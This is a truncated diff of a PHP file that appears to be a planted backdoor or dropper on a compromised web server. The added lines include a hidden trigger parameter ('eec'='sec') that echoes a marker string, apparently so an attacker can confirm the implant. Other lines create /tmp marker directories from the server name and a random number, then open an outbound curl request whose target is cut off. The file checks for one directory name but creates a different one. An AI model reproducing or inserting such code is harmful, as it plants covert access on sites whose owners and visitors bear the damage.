@@ -1,8 +1,11 @@
 <?php 
+
+if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ echo'Apac Rec'; }
+
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/b3d3dkkk'.$d.$random)) { } else {
-	mkdir('/tmp/b3d3dkkk'.$d.$random);
+if(file_exists('/tmp/dfgdfg'.$d.$random)) { } else {
+	mkdir('/tmp/dfgdfgdfgdf'.$d.$random);
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
